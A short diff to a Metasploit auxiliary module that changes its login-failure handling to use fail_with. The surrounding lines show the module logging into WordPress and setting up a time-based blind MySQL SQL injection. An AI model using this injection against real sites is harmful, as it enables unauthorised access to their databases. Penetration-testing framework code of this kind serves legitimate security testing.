@@ -64,10 +64,8 @@ class MetasploitModule < Msf::Auxiliary
 
     cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])
 
-    if cookie.nil?
-      vprint_error('Invalid login, check credentials')
-      return
-    end
+    fail_with(Failure::NoAccess, 'Invalid login, check credentials') if cookie.nil?
+
     formid = Rex::Text.rand_text_numeric(2)
     vprint_status("Using formid of: #{formid}")
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
